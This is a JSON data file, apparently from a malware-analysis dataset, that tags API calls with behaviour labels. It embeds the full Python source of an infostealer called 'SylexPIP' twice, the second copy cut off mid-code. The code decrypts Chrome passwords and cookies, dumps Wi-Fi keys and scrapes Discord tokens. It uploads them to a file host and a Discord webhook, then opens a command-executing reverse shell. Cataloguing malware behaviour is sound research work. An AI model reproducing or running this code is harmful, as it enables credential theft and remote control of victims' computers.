          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "win32crypt.CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "sqlite3.connect",
          "id": "open_sqlite_db",
          "description": "Opens SQLite database file",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.cursor",
          "id": "create_sql_cursor",
          "description": "Creates cursor object for SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "EVIL.LOGGER.GetChromeCookies.DecryptData",
          "id": "decrypt_chromium_cookies",
          "description": "Decrypts Chromium-based browser cookies for specified domain",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "cookie_theft"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "sqlite3.Cursor.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.commit",
          "id": "commit_transaction",
          "description": "Commits current transaction to SQLite database",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.close",
          "id": "close_sqlite_connection",
          "description": "Closes the SQLite database connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "json.dumps",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "socket.socket",
          "id": "create_socket",
          "description": "Creates new socket object",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "socket_creation"
        },
        {
          "api_name": "socket.socket.connect",
          "id": "establish_tcp_connection",
          "description": "Establishes TCP connection to specified address",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "socket.socket.send",
          "id": "send_socket_data",
          "description": "Sends data over socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "data_transmission"
        },
        {
          "api_name": "EVIL.NETWORK.onLoad",
          "id": "send_discord_embed",
          "description": "Sends embed message to Discord channel",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "socket.socket.recv",
          "id": "receive_socket_data",
          "description": "Receives data from socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "data_transmission"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "socket.socket.send",
          "id": "send_socket_data",
          "description": "Sends data over socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "data_transmission"
        },
        {
          "api_name": "socket.socket.send",
          "id": "send_socket_data",
          "description": "Sends data over socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "data_transmission"
        },
        {
          "api_name": "socket.socket.close",
          "id": "close_socket",
          "description": "Closes the socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        }
      ],
      "contextual_code": "import re, os, time, shutil, sqlite3, base64, json, sys, string\nimport socket as sock\nimport subprocess as sp\nfrom random import choice\nfrom requests import get, post\nfrom datetime import datetime, timedelta\nfrom uuid import getnode\nfrom win32crypt import CryptUnprotectData\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)\n\nclass VARIABLES:\n    webhook    = \"https://discord.com/api/webhooks/1085607111062454374/bnEvq061GcWHDip-IEF1IJwvOjmVQXhWJMQeFhGK95Edy5QLx1FPkXbDpnB97tebw566\" # your discord webhook\n    printOnEnd = False # True = don't print endText when program finished - False = don't print\n    endText    = \"PROGRAM FINISHED\" # change this to whatever you want to print when the program finishes\n    REVSHELL  = True # False = dont connect to your shell - True = try to connect to your shell\n    serverip  = \"192.168.1.37\" # your server/host ip for victim to connect to \n    buffer    = 1024 # buffer to send (in bytes) each packet\n    port      = 4444 # server port to connect to\n\nclass EVIL:\n    class LOGGER:\n        def __init__(self):\n            self.errors  = \"\"\n            self.INFO    = {'System': pf.system(), 'Release': pf.release(),\n            'Version': pf.version(), 'Arch': pf.machine(),\n            'Host': sock.gethostname(), 'Local IP': sock.gethostbyname(sock.gethostname()),\n            'IP Addr': get(\"https://icanhazip.com\").text.split(\"\\n\")[0], 'MAC Addr': ':'.join(re.findall('..', '%012x' % getnode()))\n            }\n\n        def RndFileName(self):\n            rnd = ''.join(choice(string.ascii_letters) for i in range(6))\n            return f\"C:\\\\ProgramData\\\\{rnd}.txt\"\n\n        def UploadFile(self, filepath, filename=\"File\") -> str:\n            server = 'https://store4.gofile.io/uploadFile'\n            try:\n                file = {'file': open(filepath, \"rb\")}\n                resp = post(server, files=file).json()\n                filelink = f\"[{filename}]({resp['data']['downloadPage']})\"\n            except Exception as error:\n                LOGGER.errors += f\"{error}\\n\"\n                filelink = \"Upload Error\"\n            return filelink\n\n        def ErrorLog(self) -> str:\n            randomfilename = LOGGER.RndFileName()\n            with open(randomfilename, 'w') as file:\n                file.write(str(self.errors))\n                file.close()\n                return self.UploadFile(randomfilename, filename=\"System Error Log\") \\\n                    if self.errors != \"\" else \"No System Error Log\"\n\n        class GetWifiPasswords:\n            def __init__(self):\n                self.command = \"netsh wlan show profile\"\n                self.passwords = \"\"\n            \n            def Passwords(self) -> str:\n                networks = sp.check_output(self.command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)\n                networks = networks.decode(encoding=\"latin-1\", errors=\"strict\")\n                network_list = re.findall(\"(?:Profile\\s*:\\s)(.*)\", networks) \n\n                for network_name in network_list:\n                    try:\n                        command = \"netsh wlan show profile \" + network_name + \" key=clear\"\n                        current_result = sp.check_output(command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)\n                        current_result = current_result.decode(encoding=\"latin-1\", errors=\"strict\")        \n                        \n                        ssid = re.findall(\"(?:SSID name\\s*:\\s)(.*)\", str(current_result))\n                        authentication = re.findall(r\"(?:Authentication\\s*:\\s)(.*)\", current_result)\n                        cipher = re.findall(\"(?:Cipher\\s*:\\s)(.*)\", current_result)\n                        security_key = re.findall(r\"(?:Security key\\s*:\\s)(.*)\", current_result)\n                        password = re.findall(\"(?:Key Content\\s*:\\s)(.*)\", current_result)\n                        \n                        self.passwords += f\"\\n\\nSSID           : {ssid[0]}\"\n                        self.passwords += f\"Authentication : {authentication[0]}\"\n                        self.passwords += f\"Cipher         : {cipher[0]}\"\n                        self.passwords += f\"Security Key   : {security_key[0]}\"\n                        self.passwords += f\"Password       : {password[0]}\"\n                    except Exception as error:\n                        LOGGER.errors += f\"{error}\\n\"\n\n                return self.passwords\n\n            def Main(self) -> str:\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    file.write(str(self.Passwords()))\n                    file.close()\n                return LOGGER.UploadFile(randomfilename, filename=\"WiFi Passwords\")\n\n        class GetChromePasswords:\n            def __init__(self):\n                self.passwordlog = \"\"\n                self.APP_DATA_PATH   = os.environ['LOCALAPPDATA']\n                self.DB_PATH         = r'Google\\Chrome\\User Data\\Default\\Login Data'\n                self.NONCE_BYTE_SIZE = 12\n\n            def AddPassword(self, db_file):\n                conn = sqlite3.connect(db_file)\n                _sql = 'select signon_realm,username_value,password_value from logins'\n                for row in conn.execute(_sql):\n                    host = row[0]\n                    if host.startswith('android'):\n                        continue\n                    name = row[1]\n                    value = self.ChromeDecrypt(row[2])\n                    _info = 'Hostname: %s\\nUsername: %s\\nPassword: %s\\n\\n' %(host,name,value)\n                    self.passwordlog += _info\n                conn.close()\n                os.remove(db_file)\n\n            def ChromeDecrypt(self, encrypted_txt):\n                if encrypted_txt[:4] == b'\\x01\\x00\\x00\\x00':\n                    decryptedtxt = self.DecryptDPAPI(encrypted_txt)\n                    return decryptedtxt.decode()\n                elif encrypted_txt[:3] == b'v10':\n                    decryptedtxt = self.DecryptAES(encrypted_txt)\n                    return decryptedtxt[:-16].decode()\n\n            def Decrypt(self, cipher, ciphertext, nonce):\n                cipher.mode = modes.GCM(nonce)\n                decryptor = cipher.decryptor()\n                return decryptor.update(ciphertext)\n\n            def GetCipher(self, key):\n                cipher = Cipher(\n                    algorithms.AES(key),\n                    None,\n                    backend=default_backend()\n                )\n                return cipher\n\n            def DecryptDPAPI(self, encrypted):\n                import ctypes\n                import ctypes.wintypes\n\n                class DATA_BLOB(ctypes.Structure):\n                    _fields_ = [('cbData', ctypes.wintypes.DWORD),\n                                ('pbData', ctypes.POINTER(ctypes.c_char))]\n\n                p = ctypes.create_string_buffer(encrypted, len(encrypted))\n                blobin = DATA_BLOB(ctypes.sizeof(p), p)\n                blobout = DATA_BLOB()\n                retval = ctypes.windll.crypt32.CryptUnprotectData(\n                    ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))\n                if not retval:\n                    raise ctypes.WinError()\n                result = ctypes.string_at(blobout.pbData, blobout.cbData)\n                ctypes.windll.kernel32.LocalFree(blobout.pbData)\n                return result\n\n            def LocalKey(self):\n                jsn = None\n                with open(os.path.join(os.environ['LOCALAPPDATA'], r\"Google\\Chrome\\User Data\\Local State\"), encoding='latin-1', mode =\"r\") as f:\n                    jsn = json.loads(str(f.readline()))\n                return jsn[\"os_crypt\"][\"encrypted_key\"]\n\n            def DecryptAES(self, encrypted_txt):\n                encoded_key   = self.LocalKey()\n                encrypted_key = base64.b64decode(encoded_key.encode())\n                encrypted_key = encrypted_key[5:]\n                key           = self.DecryptDPAPI(encrypted_key)\n                nonce         = encrypted_txt[3:15]\n                cipher        = self.GetCipher(key)\n                return self.Decrypt(cipher, encrypted_txt[15:], nonce)\n\n            def Main(self):\n                _full_path = os.path.join(self.APP_DATA_PATH, self.DB_PATH)\n                _temp_path = os.path.join(self.APP_DATA_PATH, 'sqlite_file')\n                shutil.copyfile(_full_path,_temp_path)\n                self.AddPassword(_temp_path)\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    file.write(str(self.passwordlog))\n                    file.close()\n                    return LOGGER.UploadFile(randomfilename, filename=\"Chrome Passwords\")\n\n        class GetChromeCookies:\n            def __init__(self):\n                local_state_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Local State\")\n                with open(local_state_path, \"r\", encoding=\"latin-1\") as f: local_state = json.loads(f.read())\n                key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n                self.key = CryptUnprotectData(key, None, None, None, 0)[1]\n\n            def TimeReadable(self, chromedate):\n                if chromedate != 86400000000 and chromedate:\n                    try: return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)\n                    except Exception as error: LOGGER.errors += f\"{error}\\n\"\n                else: return \"\"\n\n            def DecryptData(self, data, key):\n                try:\n                    from Crypto.Cipher import AES\n                    iv = data[3:15]\n                    data = data[15:]\n                    cipher = AES.new(key, AES.MODE_GCM, iv)\n                    return cipher.Decrypt(data)[:-16].decode()\n                except:\n                    try: return str(CryptUnprotectData(data, None, None, None, 0)[1])\n                    except: return \"\"\n\n            def Main(self):\n                db_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Default\", \"Network\", \"Cookies\")\n                filename = \"Cookies.db\"\n                if not os.path.isfile(filename):\n                    shutil.copyfile(db_path, filename)\n                db = sqlite3.connect(filename)\n                db.text_factory = lambda b: b.decode(errors=\"ignore\")\n                cursor = db.cursor()\n                cursor.execute(\"\"\"\n                SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value \n                FROM cookies\"\"\")\n                key = self.key\n                try:\n                    randomfilename = LOGGER.RndFileName()\n                    with open(randomfilename, 'w', encoding=\"latin-1\") as file:\n                        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():\n                            decrypted_value = self.DecryptData(encrypted_value, key) if not value else value\n                            file.write(f\"\"\"\n                                URL: {host_key}\n                                Cookie name: {name}\n                                Cookie value (encrypted): {encrypted_value}\n                                Cookie value (decrypted): {decrypted_value}\n                                Creation date: {self.TimeReadable(creation_utc)}\n                                Last accessed: {self.TimeReadable(last_access_utc)}\n                                Expires at: {self.TimeReadable(expires_utc)}\n                            \"\"\")\n                            cursor.execute(\"\"\"\n                            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\n                            WHERE host_key = ?\n                            AND name = ?\"\"\", (decrypted_value, host_key, name))\n                        file.close()\n                    db.commit()\n                    db.close()\n                    return LOGGER.UploadFile(randomfilename, filename=\"Chrome Cookies\")\n                except Exception as error:\n                    LOGGER.errors += f\"{error}\\n\"\n                    return \"No Chrome Cookie File\"\n\n        class DiscordTokens:\n            def __init__(self):\n                self.tokens = []\n                self.rawtokens = \"\"\n                self.tokeninfo = \"\"\n\n            def GetTokens(self) -> None:\n                LOCAL = os.getenv(\"LOCALAPPDATA\")\n                ROAMING = os.getenv(\"APPDATA\")\n                PATHS = {\n                    ...\n                }\n                \n                for platform, path in PATHS.items():\n                    path = os.path.join(path, \"Local Storage\", \"leveldb\")\n                    if os.path.exists(path):\n                        for file_name in os.listdir(path):\n                            if file_name.endswith(\".log\") or file_name.endswith(\".ldb\") or file_name.endswith(\".sqlite\"):\n                                for line in [x.strip() for x in open(os.path.join(path, file_name), errors=\"ignore\").readlines() if x.strip()]:\n                                    for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\", r\"mfa\\.[\\w-]{84}\"):\n                                        for token in re.findall(regex, line):\n                                            if token + \" -> \" + platform not in self.tokens:\n                                                self.tokens.append(token + \" -> \" + platform)\n                                                self.rawtokens += f\"\\n{token}\\n\"\n                return self.tokens\n\n            def Main(self):\n                self.GetTokens()\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    for index in range(len(self.tokens)):\n                        self.tokeninfo += f\"[{index+1}] {self.tokens[index]}\\n\"\n                    file.write(str(self.tokeninfo))\n                    file.close()\n\n                return LOGGER.UploadFile(randomfilename, filename=\"Token File\"), self.rawtokens\n\n            def Valid(self, token):\n                headers = { 'Authorization': token, 'Content-Type': 'application/json' }\n                r = get('https://discordapp.com/api/v9/users/@me', headers=headers)\n                return True if r.status_code == 200 else False\n\n        def Main(self):\n            WifiPass   = self.GetWifiPasswords()\n            ChromePass = self.GetChromePasswords()\n            ChromeCks  = self.GetChromeCookies()\n            DiscTokens = self.DiscordTokens()\n            wifi_passwords   = WifiPass.Main()\n            chrome_passwords = ChromePass.Main()\n            chrome_cookies   = ChromeCks.Main()\n            discord_tokens   = DiscTokens.Main()\n\n            system_info = \"\"\n            for key in self.INFO:\n                system_info += f\"{key} : {self.INFO[key]}\\n\"\n\n            embed = {\n                \"color\": 0x000000,\n                        \"fields\": [\n                            {\n                                \"name\": \"**Tokens**\",\n                                \"value\": f\"```{discord_tokens[1]}```\"\n                            },\n                            {\n                                \"name\": \"System Information\",\n                                \"value\": f\"```{system_info}```\"\n                            },\n                            {\n                                \"name\": \"Python Version\",\n                                \"value\": f\"```{pf.python_version()}```\"\n                            },\n                            {\n                                \"name\": \"System Files\",\n                                \"value\": f\"**{discord_tokens[0]}**\\n**{wifi_passwords}**\\n**{chrome_passwords}**\\n**{chrome_cookies}**\\n**{self.ErrorLog()}**\"\n                            }\n                        ],\n                        \"author\": {\n                            \"name\": f\"SylexPIP ✔️\"\n                        },\n                        \"footer\": {\n                            \"text\": f\"github.com/codeuk/sylexpip\"\n                        },\n                    }\n\n            heading = {\n                \"content\": f\"**SylexPIP Executed** ||@everyone||\",\n                \"embeds\": [embed],\n                \"username\": \"SylexPIP\"\n            }\n            req = post(VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode())\n\n            NETWORK = PROGRAM.NETWORK()\n            NETWORK.Main() if VARIABLES.REVSHELL else NETWORK.Persistence()\n\n    class NETWORK:\n        def __init__(self):\n            self.ip = get(\"https://icanhazip.com\").text.split(\"\\n\")[0]\n            self.cwd = os.getcwd()\n\n        def Persistence(self):\n            return None\n\n        def onLoad(self):\n            embed = {\n                        \"color\": 0x000000,\n                        \"fields\": [\n                            {\n                                \"name\": \"**Reverse Shell Connected**\",\n                                \"value\": f\"```{self.ip} -> {VARIABLES.serverip}:{VARIABLES.port}```\"\n                            },\n                            {\n                                \"name\": \"**Configuration**\",\n                                \"value\": f\"\"\"```PORT -> {VARIABLES.port}\\nIP   -> {self.ip}\\\n                                    \\nBUFFER -> {VARIABLES.buffer}\\nSERVER -> {VARIABLES.serverip}```\"\"\"\n                            }\n                        ],\n                        \"author\": {\"name\": f\"SylexPIP ✔️\"},\n                        \"footer\": {\"text\": f\"github.com/codeuk/sylexpip\"},\n                    }\n            heading = { \"content\": \"\", \"embeds\": [embed], \"username\": \"SylexPIP\" }\n            req = post(VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode())\n\n        def Main(self):\n            s = sock.socket()\n            s.connect((VARIABLES.serverip, VARIABLES.port))\n            s.send(self.cwd.encode())\n            self.onLoad()\n\n            while True:\n                try:\n                    command = s.recv(VARIABLES.buffer).decode()\n                    split_command = command.split()\n                    if split_command[0] == \"localtunnel\":\n                        try:\n                            tunnel_port = split_command[1]\n                            tunnel_inst = sp.getoutput(\"npm install -g localtunnel\")\n                            tunnel_link = sp.getoutput(f\"lt --port {tunnel_port}\")\n                            http_server = sp.getoutput(f\"python -m http.server --directory C:// {tunnel_port}\")\n                            output = f\"[*] Started localtunnel @ {tunnel_link}\"\n                        except Exception as error:\n                            output = \"[!] Couldn't start localtunnel: \", error\n                    elif command.lower() == \"exit\":\n                        break\n                    else:\n                        output = sp.getoutput(command)\n                    message = f\"{output}\\n\"\n                    s.send(message.encode())\n                except Exception as error:\n                    s.send(\"[!] Error on client side!\".encode())\n            s.close()\n\nPROGRAM = EVIL()\nLOGGER  = PROGRAM.LOGGER()\nLOGGER.Main()\nprint(VARIABLES.endText if VARIABLES.printOnEnd else \"\")"
    }
  },
  {
    "pyfile": "__main__.py",
    "code_snippet": "import re, os, time, shutil, sqlite3, base64, json, sys, string\nimport socket as sock\nimport subprocess as sp\nfrom random import choice\nfrom requests import get, post\nfrom datetime import datetime, timedelta\nfrom uuid import getnode\nfrom win32crypt import CryptUnprotectData\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)\n\nclass VARIABLES:\n    webhook    = \"https://discord.com/api/webhooks/1085607111062454374/bnEvq061GcWHDip-IEF1IJwvOjmVQXhWJMQeFhGK95Edy5QLx1FPkXbDpnB97tebw566\" # your discord webhook\n    printOnEnd = False # True = don't print endText when program finished - False = don't print\n    endText    = \"PROGRAM FINISHED\" # change this to whatever you want to print when the program finishes\n    REVSHELL  = True # False = dont connect to your shell - True = try to connect to your shell\n    serverip  = \"192.168.1.37\" # your server/host ip for victim to connect to \n    buffer    = 1024 # buffer to send (in bytes) each packet\n    port      = 4444 # server port to connect to\n\nclass EVIL:\n    \"\"\" SylexPIP Malware \"\"\"\n\n    class LOGGER:\n        \"\"\" Discord/System grabbing \"\"\"\n        def __init__(self):\n            self.errors  = \"\"\n            self.INFO    = {'System': pf.system(), 'Release': pf.release(),\n            'Version': pf.version(), 'Arch': pf.machine(),\n            'Host': sock.gethostname(), 'Local IP': sock.gethostbyname(sock.gethostname()),\n            'IP Addr': get(\"https://icanhazip.com\").text.split(\"\\n\")[0], 'MAC Addr': ':'.join(re.findall('..', '%012x' % getnode()))\n            }\n\n        def RndFileName(self):\n            rnd = ''.join(choice(string.ascii_letters) for i in range(6))\n            return f\"C:\\\\ProgramData\\\\{rnd}.txt\"\n\n        def UploadFile(self, filepath, filename=\"File\") -> str:\n            server = 'https://store4.gofile.io/uploadFile'\n            try:\n                file = {'file': open(filepath, \"rb\")}\n                resp = post(server, files=file).json()\n                filelink = f\"[{filename}]({resp['data']['downloadPage']})\"\n            except Exception as error:\n                LOGGER.errors += f\"{error}\\n\"\n                filelink = \"Upload Error\"\n            return filelink\n\n        def ErrorLog(self) -> str:\n            randomfilename = LOGGER.RndFileName()\n            with open(randomfilename, 'w') as file:\n                file.write(str(self.errors))\n                file.close()\n                return self.UploadFile(randomfilename, filename=\"System Error Log\") \\\n                    if self.errors != \"\" else \"No System Error Log\"\n\n        class GetWifiPasswords:\n            \"\"\" Write wifi passwords to file and upload \"\"\"\n            def __init__(self):\n                self.command = \"netsh wlan show profile\"\n                self.passwords = \"\"\n                \n            def Passwords(self) -> str:\n                networks = sp.check_output(self.command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)\n                networks = networks.decode(encoding=\"latin-1\", errors=\"strict\")\n                network_list = re.findall(\"(?:Profile\\s*:\\s)(.*)\", networks) \n\n                for network_name in network_list:\n                    try:\n                        command = \"netsh wlan show profile \" + network_name + \" key=clear\"\n                        current_result = sp.check_output(command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)\n                        current_result = current_result.decode(encoding=\"latin-1\", errors=\"strict\")        \n                        \n                        ssid = re.findall(\"(?:SSID name\\s*:\\s)(.*)\", str(current_result))\n                        authentication = re.findall(r\"(?:Authentication\\s*:\\s)(.*)\", current_result)\n                        cipher = re.findall(\"(?:Cipher\\s*:\\s)(.*)\", current_result)\n                        security_key = re.findall(r\"(?:Security key\\s*:\\s)(.*)\", current_result)\n                        password = re.findall(\"(?:Key Content\\s*:\\s)(.*)\", current_result)\n                        \n                        self.passwords += f\"\\n\\nSSID           : {ssid[0]}\"\n                        self.passwords += f\"Authentication : {authentication[0]}\"\n                        self.passwords += f\"Cipher         : {cipher[0]}\"\n                        self.passwords += f\"Security Key   : {security_key[0]}\"\n                        self.passwords += f\"Password       : {password[0]}\"\n                    except Exception as error:\n                        LOGGER.errors += f\"{error}\\n\"\n\n                return self.passwords\n\n            def Main(self) -> str:\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    file.write(str(self.Passwords()))\n                    file.close()\n                return LOGGER.UploadFile(randomfilename, filename=\"WiFi Passwords\")\n\n\n        class GetChromePasswords:\n            \"\"\" Decrypt all saved chrome passwords and upload file \"\"\"\n            def __init__(self):\n                self.passwordlog = \"\"\n                self.APP_DATA_PATH   = os.environ['LOCALAPPDATA']\n                self.DB_PATH         = r'Google\\Chrome\\User Data\\Default\\Login Data'\n                self.NONCE_BYTE_SIZE = 12\n\n            def AddPassword(self, db_file):\n                conn = sqlite3.connect(db_file)\n                _sql = 'select signon_realm,username_value,password_value from logins'\n                for row in conn.execute(_sql):\n                    host = row[0]\n                    if host.startswith('android'):\n                        continue\n                    name = row[1]\n                    value = self.ChromeDecrypt(row[2])\n                    _info = 'Hostname: %s\\nUsername: %s\\nPassword: %s\\n\\n' %(host,name,value)\n                    self.passwordlog += _info\n                conn.close()\n                os.remove(db_file)\n\n            def ChromeDecrypt(self, encrypted_txt):\n                if encrypted_txt[:4] == b'\\x01\\x00\\x00\\x00':\n                    decryptedtxt = self.DecryptDPAPI(encrypted_txt)\n                    return decryptedtxt.decode()\n                elif encrypted_txt[:3] == b'v10':\n                    decryptedtxt = self.DecryptAES(encrypted_txt)\n                    return decryptedtxt[:-16].decode()\n\n            def Decrypt(self, cipher, ciphertext, nonce):\n                cipher.mode = modes.GCM(nonce)\n                decryptor = cipher.decryptor()\n                return decryptor.update(ciphertext)\n\n            def GetCipher(self, key):\n                cipher = Cipher(\n                    algorithms.AES(key),\n                    None,\n                    backend=default_backend()\n                )\n                return cipher\n\n            def DecryptDPAPI(self, encrypted):\n                import ctypes\n                import ctypes.wintypes\n\n                class DATA_BLOB(ctypes.Structure):\n                    _fields_ = [('cbData', ctypes.wintypes.DWORD),\n                                ('pbData', ctypes.POINTER(ctypes.c_char))]\n\n                p = ctypes.create_string_buffer(encrypted, len(encrypted))\n                blobin = DATA_BLOB(ctypes.sizeof(p), p)\n                blobout = DATA_BLOB()\n                retval = ctypes.windll.crypt32.CryptUnprotectData(\n                    ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))\n                if not retval:\n                    raise ctypes.WinError()\n                result = ctypes.string_at(blobout.pbData, blobout.cbData)\n                ctypes.windll.kernel32.LocalFree(blobout.pbData)\n                return result\n\n            def LocalKey(self):\n                jsn = None\n                with open(os.path.join(os.environ['LOCALAPPDATA'], r\"Google\\Chrome\\User Data\\Local State\"), encoding='latin-1', mode =\"r\") as f:\n                    jsn = json.loads(str(f.readline()))\n                return jsn[\"os_crypt\"][\"encrypted_key\"]\n\n            def DecryptAES(self, encrypted_txt):\n                encoded_key   = self.LocalKey()\n                encrypted_key = base64.b64decode(encoded_key.encode())\n                encrypted_key = encrypted_key[5:]\n                key           = self.DecryptDPAPI(encrypted_key)\n                nonce         = encrypted_txt[3:15]\n                cipher        = self.GetCipher(key)\n                return self.Decrypt(cipher, encrypted_txt[15:], nonce)\n\n            def Main(self):\n                _full_path = os.path.join(self.APP_DATA_PATH, self.DB_PATH)\n                _temp_path = os.path.join(self.APP_DATA_PATH, 'sqlite_file')\n                shutil.copyfile(_full_path,_temp_path)\n                self.AddPassword(_temp_path)\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    file.write(str(self.passwordlog))\n                    file.close()\n                    return LOGGER.UploadFile(randomfilename, filename=\"Chrome Passwords\")\n\n\n        class GetChromeCookies:\n            \"\"\" Get Chrome Cookies - Current error: can't decrypt cookies \"\"\"\n            def __init__(self):\n                local_state_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Local State\")\n                with open(local_state_path, \"r\", encoding=\"latin-1\") as f: 